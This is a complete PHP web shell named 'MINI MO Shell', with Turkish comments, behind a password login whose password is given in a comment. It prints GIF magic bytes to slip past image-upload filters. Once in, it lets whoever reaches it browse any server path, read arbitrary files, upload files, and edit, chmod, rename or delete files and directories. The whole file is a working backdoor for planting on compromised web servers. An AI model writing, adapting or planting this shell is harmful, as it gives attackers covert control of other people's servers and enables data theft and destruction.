<?php

error_reporting(0);
set_time_limit(0);

// === GİRİŞ KONTROLÜ BAŞLANGIÇ ===
// session_start() HER ZAMAN echo/print/boşluktan ÖNCE olmalı!
if (!isset($_SESSION)) {
    session_start();
}

$correct_hash = '532eef8f181a7fd25d341cb93ec76055'; // FUCKOFF

// Çıkış işlemi
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// Giriş formu gönderildiyse kontrol et
if (isset($_POST['login_pass'])) {
    if (md5($_POST['login_pass']) === $correct_hash) {
        $_SESSION['shell_auth'] = true;
        $_SESSION['shell_time'] = time();
    } else {
        $login_error = true;
    }
}

// Oturum kontrolü - 30 dakika timeout
if (!isset($_SESSION['shell_auth']) || $_SESSION['shell_auth'] !== true) {
    // Giriş formu göster
    echo "<!DOCTYPE HTML>
<html>
<head>
";
    echo "<meta charset=\"UTF-8\">
";
    echo "<title>MINI MO Shell - Giriş</title>
";
    echo "<style>
    body{ 
        font-family: 'Racing Sans One', cursive; 
        background-color: #0a0a0a; 
        color: white; 
        display: flex; 
        justify-content: center; 
        align-items: center; 
        height: 100vh; 
        margin: 0; 
    }
    .login-box {
        border: 2px solid #0000ff;
        border-radius: 10px;
        padding: 40px;
        background-color: #111;
        text-align: center;
        box-shadow: 0 0 20px rgba(0,0,255,0.3);
    }
    .login-box h2 {
        color: #0000ff;
        margin-bottom: 20px;
        text-shadow: 0 0 10px rgba(0,0,255,0.5);
    }
    .login-box input[type=\"password\"] {
        width: 250px;
        padding: 10px;
        border: 1px solid #0000ff;
        border-radius: 5px;
        background-color: #000;
        color: white;
        font-size: 16px;
        text-align: center;
        margin-bottom: 15px;
    }
    .login-box input[type=\"submit\"] {
        padding: 10px 30px;
        border: 1px solid #0000ff;
        border-radius: 5px;
        background-color: #0000ff;
        color: white;
        font-size: 16px;
        cursor: pointer;
        font-family: 'Racing Sans One', cursive;
    }
    .login-box input[type=\"submit\"]:hover {
        background-color: #0000cc;
        box-shadow: 0 0 10px #0000ff;
    }
    .error {
        color: #ff4444;
        margin-bottom: 10px;
        text-shadow: 0 0 5px #ff0000;
    }
    </style>
</head>
<body>
";
    echo "<div class=\"login-box\">
";
    echo "<h2>MINI MO SHELL</h2>
";
    if (isset($login_error)) {
        echo "<div class=\"error\">Şifre Hatalı!</div>
";
    }
    echo "<form method=\"POST\">
";
    echo "<input type=\"password\" name=\"login_pass\" placeholder=\"Şifrenizi Girin\" autofocus autocomplete=\"off\"><br>
";
    echo "<input type=\"submit\" value=\"GİRİŞ\">
";
    echo "</form>
";
    echo "</div>
</body>
</html>";
    exit;
}

// Timeout kontrolü (30 dakika)
if (isset($_SESSION['shell_time']) && (time() - $_SESSION['shell_time'] > 1800)) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}
// Her işlemde zamanı güncelle
$_SESSION['shell_time'] = time();
// === GİRİŞ KONTROLÜ BİTİŞ ===

// GIF magic bytes - header sonrası echo ile (image bypass için)
echo "GIF94;";

// Ana değişkenler
$current_path = (isset($_GET["path"])) ? $_GET["path"] : getcwd();
$current_path = str_replace("\\", "/", $current_path);
$path_parts = explode("/", $current_path);

// Sayfa başlangıcı (HTML)
echo "<!DOCTYPE HTML>
<html>
<head>
";
echo "<link href=\"\" rel=\"stylesheet\" type=\"text/css\">
";
echo "<title>MINI MO Shell - Tarih Gösterimli</title>
";
echo "<style>
body{ font-family: \"Racing Sans One\", cursive; background-color: black; color:white; }
#content tr:hover{ background-color: blue; text-shadow:0px 0px 10px #ff6f; }
#content .first{ background-color: blue; }
table{ border: 1px #0000ff dotted; }
a{ color:white; text-decoration: none; }
a:hover{ color:blue; text-shadow:0px 0px 10px #ffff66; }
input,select,textarea{ border: 1px #000000 solid; -moz-border-radius:5px; -webkit-border-radius:5px; border-radius:5px; }
/* Tarih sütunu için renklendirme */
.date-recent { color: #ff5555; font-weight: bold; }
.date-today { color: #ffaa00; font-weight: bold; }
.date-week { color: #55ff55; }
.date-old { color: #888888; }
.logout-btn { 
    position: fixed; 
    top: 10px; 
    right: 10px; 
    background-color: #ff0000; 
    color: white; 
    padding: 8px 15px; 
    border-radius: 5px; 
    text-decoration: none; 
    font-weight: bold;
    border: 1px solid #ff0000;
}
.logout-btn:hover { 
    background-color: #cc0000; 
    color: white; 
    box-shadow: 0 0 10px #ff0000;
}
</style>
</head>
<body>
";

// Çıkış butonu
echo "<a href=\"?logout=1\" class=\"logout-btn\">ÇIKIŞ</a>
";

// Başlık
echo "<h1><center><font color=\"blue\">MINI MINI MANI MO - TARİH GÖSTERİMLİ</font></center></h1>
";

// --- Path Gezinti Çubuğu ---
echo "<table width=\"800\" border=\"0\" cellpadding=\"3\" cellspacing=\"1\" align=\"center\">
<tr><td><font color=\"white\">Path :</font> ";
foreach ($path_parts as $index => $part) {
    if ($part == "" && $index == 0) {
        echo "<a href=\"?path=/\">/</a>";
        continue;
    }
    if ($part == "") continue;
    echo "<a href=\"?path=";
    for ($i = 0; $i <= $index; $i++) {
        echo $path_parts[$i];
        if ($i != $index) echo "/";
    }
    echo "\">$part</a>/";
}
echo "</td></tr>
";

// --- Dosya Yükleme Formu ---
echo "<tr><td>";
if (isset($_FILES["file"])) {
    if (copy($_FILES["file"]["tmp_name"], $current_path . "/" . $_FILES["file"]["name"])) {
        echo "<font color=\"green\">Upload Başarılı</font><br />";
    } else {
        echo "<font color=\"red\">Upload Başarısız</font><br />";
    }
}
echo "<form enctype=\"multipart/form-data\" method=\"POST\">
";
echo "<font color=\"white\">File Upload :</font> <input type=\"file\" name=\"file\" />
";
echo "<input type=\"submit\" value=\"upload\" />
";
echo "</form>
";
echo "</td></tr>
";

// --- Dosya İşlemleri (Görüntüleme, Düzenleme, Silme, Yetki, İsim) ---
if (isset($_GET["filesrc"])) {
    // Dosya İçeriğini Görüntüle
    echo "<tr><td>Current File : " . $_GET["filesrc"] . "</td></tr></table><br />";
    echo ("<pre>" . htmlspecialchars(file_get_contents($_GET["filesrc"])) . "</pre>");
} elseif (isset($_GET["option"]) && $_POST["opt"] != "delete") {
    echo "</table><br /><center>" . $_POST["path"] . "<br /><br />";
    if ($_POST["opt"] == "chmod") {
        // Yetki Değiştirme
        if (isset($_POST["perm"])) {
            if (chmod($_POST["path"], $_POST["perm"])) {
                echo "<font color=\"green\">Change Permission Başarılı</font><br/>";
            } else {
                echo "<font color=\"red\">Change Permission Başarısız</font><br />";
            }
        }
        echo "<form method=\"POST\">
Permission : <input name=\"perm\" type=\"text\" size=\"4\" value=\"" . substr(sprintf("%o", fileperms($_POST["path"])), -4) . "\" />
";
        echo "<input type=\"hidden\" name=\"path\" value=\"" . $_POST["path"] . "\">
";
        echo "<input type=\"hidden\" name=\"opt\" value=\"chmod\">
";
        echo "<input type=\"submit\" value=\"Go\" />
</form>";
    } elseif ($_POST["opt"] == "rename") {
        // İsim Değiştirme
        if (isset($_POST["newname"])) {
            if (rename($_POST["path"], dirname($_POST["path"]) . "/" . $_POST["newname"])) {
                echo "<font color=\"green\">Rename Başarılı</font><br/>";
            } else {
                echo "<font color=\"red\">Rename Başarısız</font><br />";
            }
            $_POST["name"] = $_POST["newname"];
        }
        echo "<form method=\"POST\">
New Name : <input name=\"newname\" type=\"text\" size=\"20\" value=\"" . $_POST["name"] . "\" />
";
        echo "<input type=\"hidden\" name=\"path\" value=\"" . $_POST["path"] . "\">
";
        echo "<input type=\"hidden\" name=\"opt\" value=\"rename\">
";
        echo "<input type=\"submit\" value=\"Go\" />
</form>";
    } elseif ($_POST["opt"] == "edit") {
        // Dosya Düzenleme
        if (isset($_POST["src"])) {
            $fp = fopen($_POST["path"], "w");
            if (fwrite($fp, $_POST["src"])) {
                echo "<font color=\"green\">Edit Başarılı</font><br/>";
            } else {
                echo "<font color=\"red\">Edit Başarısız</font><br/>";
            }
            fclose($fp);
        }
        echo "<form method=\"POST\">
<textarea cols=80 rows=20 name=\"src\">" . htmlspecialchars(file_get_contents($_POST["path"])) . "</textarea><br />
";
        echo "<input type=\"hidden\" name=\"path\" value=\"" . $_POST["path"] . "\">
";
        echo "<input type=\"hidden\" name=\"opt\" value=\"edit\">
";
        echo "<input type=\"submit\" value=\"Save\" />
</form>";
    }
    echo "</center>";
} else {
    // --- Dizin Listeleme ve İşlemler ---
    echo "</table><br/><center>";

    // Silme İşlemi
    if (isset($_GET["option"]) && $_POST["opt"] == "delete") {
        if ($_POST["type"] == "dir") {
            if (rmdir($_POST["path"])) {
                echo "<font color=\"green\">Directory Silindi</font><br/>";
            } else {
                echo "<font color=\"red\">Directory Silinemedi</font><br/>";
            }
        } elseif ($_POST["type"] == "file") {
            if (unlink($_POST["path"])) {
                echo "<font color=\"green\">File Silindi</font><br/>";
            } else {
                echo "<font color=\"red\">File Silinemedi</font><br/>";
            }
        }
    }
    echo "</center>";

    // Dizindeki öğeleri listele
    if (function_exists("opendir")) {
        $handle = opendir($current_path);
        if ($handle) {
            $scan = array();
            while (($file = readdir($handle)) !== false) {
                $scan[] = $file;
            }
            closedir($handle);
            sort($scan);
        }
    } else {
        $scan = scandir($current_path);
    }

    // Dosya/Dizin Tablosu - TARİH SÜTUNU EKLENDİ
    echo "<div id=\"content\"><table width=\"900\" border=\"0\" cellpadding=\"3\" cellspacing=\"1\" align=\"center\">
";
    echo "<tr class=\"first\">
";
    echo "<td><center>Name</center></td>
";
    echo "<td><center>Size</center></td>
";
    echo "<td><center>Permission</center></td>
";
    echo "<td><center>Modified</center></td>
";  // YENİ: Tarih sütunu
    echo "<td><center>Modify</center></td>
";
    echo "</tr>
";

    // Dizinleri listele
    foreach ($scan as $item) {
        if (!is_dir($current_path . "/" . $item) || $item == "." || $item == "..") continue;

        $fullpath = $current_path . "/" . $item;
        $mtime = filemtime($fullpath);
        $date_str = date("Y-m-d H:i:s", $mtime);
        $time_diff = time() - $mtime;

        // Tarihe göre renk sınıfı
        if ($time_diff < 3600) { // Son 1 saat
            $date_class = "date-recent";
        } elseif ($time_diff < 86400) { // Son 24 saat
            $date_class = "date-today";
        } elseif ($time_diff < 604800) { // Son 7 gün
            $date_class = "date-week";
        } else {
            $date_class = "date-old";
        }

        echo "<tr>
";
        echo "<td><a href=\"?path=" . $fullpath . "\">" . $item . "</a></td>
";
        echo "<td><center>--</center></td>
";
        echo "<td><center>";
        if (is_writable($fullpath)) echo "<font color=\"green\">";
        elseif (!is_readable($fullpath)) echo "<font color=\"blue\">";
        echo perms($fullpath);
        if (is_writable($fullpath) || !is_readable($fullpath)) echo "</font>";
        echo "</center></td>
";
        // Tarih sütunu
        echo "<td><center><span class='$date_class' title='$date_str'>" . $date_str . "</span></center></td>
";
        // Modify formu
        echo "<td><center><form method=\"POST\" action=\"?option&path=" . $current_path . "\">
";
        echo "<select name=\"opt\">
<option value=\"\">Select</option>
<option value=\"delete\">Delete</option>
<option value=\"chmod\">Chmod</option>
<option value=\"rename\">Rename</option>
</select>
";
        echo "<input type=\"hidden\" name=\"type\" value=\"dir\">
";
        echo "<input type=\"hidden\" name=\"name\" value=\"" . $item . "\">
";
        echo "<input type=\"hidden\" name=\"path\" value=\"" . $fullpath . "\">
";
        echo "<input type=\"submit\" value=\">\">
</form></center></td>
";
        echo "</tr>
";
    }

    // Boşluk
    echo "<tr class=\"first\"><td></td><td></td><td></td><td></td><td></td></tr>
";

    // Dosyaları listele
    foreach ($scan as $item) {
        if (!is_file($current_path . "/" . $item)) continue;

        $fullpath = $current_path . "/" . $item;
        $file_size = filesize($fullpath) / 1024;
        $file_size = round($file_size, 3);
        if ($file_size >= 1024) {
            $file_size = round($file_size / 1024, 2) . " MB";
        } else {
            $file_size = $file_size . " KB";
        }

        $mtime = filemtime($fullpath);
        $date_str = date("Y-m-d H:i:s", $mtime);
        $time_diff = time() - $mtime;

        // Tarihe göre renk sınıfı
        if ($time_diff < 3600) { // Son 1 saat
            $date_class = "date-recent";
        } elseif ($time_diff < 86400) { // Son 24 saat
            $date_class = "date-today";
        } elseif ($time_diff < 604800) { // Son 7 gün
            $date_class = "date-week";
        } else {
            $date_class = "date-old";
        }

        echo "<tr>
";
        echo "<td><a href=\"?filesrc=" . $fullpath . "&path=" . $current_path . "\">" . $item . "</a></td>
";
        echo "<td><center>" . $file_size . "</center></td>
";
        echo "<td><center>";
        if (is_writable($fullpath)) echo "<font color=\"green\">";
        elseif (!is_readable($fullpath)) echo "<font color=\"blue\">";
        echo perms($fullpath);
        if (is_writable($fullpath) || !is_readable($fullpath)) echo "</font>";
        echo "</center></td>
";
        // Tarih sütunu
        echo "<td><center><span class='$date_class' title='$date_str'>" . $date_str . "</span></center></td>
";
        // Dosya işlem formu
        echo "<td><center><form method=\"POST\" action=\"?option&path=" . $current_path . "\">
";
        echo "<select name=\"opt\">
<option value=\"\">Select</option>
<option value=\"delete\">Delete</option>
<option value=\"chmod\">Chmod</option>
<option value=\"rename\">Rename</option>
<option value=\"edit\">Edit</option>
</select>
";
        echo "<input type=\"hidden\" name=\"type\" value=\"file\">
";
        echo "<input type=\"hidden\" name=\"name\" value=\"" . $item . "\">
";
        echo "<input type=\"hidden\" name=\"path\" value=\"" . $fullpath . "\">
";
        echo "<input type=\"submit\" value=\">\">
</form></center></td>
";
        echo "</tr>
";
    }
    echo "</table>
</div>
";
}
echo "<center><br/> OHA YOOO - Tarih: " . date("Y-m-d H:i:s") . "</center>
</body>
</html>";

// --- İzinleri Oktal ve Sembolik Olarak Gösteren Fonksiyon ---
function perms($file) {
    $perms = fileperms($file);
    // Dosya türü
    if (($perms & 0xC000) == 0xC000) { $info = 's'; }
    elseif (($perms & 0xA000) == 0xA000) { $info = 'l'; }
    elseif (($perms & 0x8000) == 0x8000) { $info = '-'; }
    elseif (($perms & 0x6000) == 0x6000) { $info = 'b'; }
    elseif (($perms & 0x4000) == 0x4000) { $info = 'd'; }
    elseif (($perms & 0x2000) == 0x2000) { $info = 'c'; }
    elseif (($perms & 0x1000) == 0x1000) { $info = 'p'; }
    else { $info = 'u'; }

    // Sahip izinleri
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));

    // Grup izinleri
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));

    // Diğer izinler
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));

    return $info;
}
?>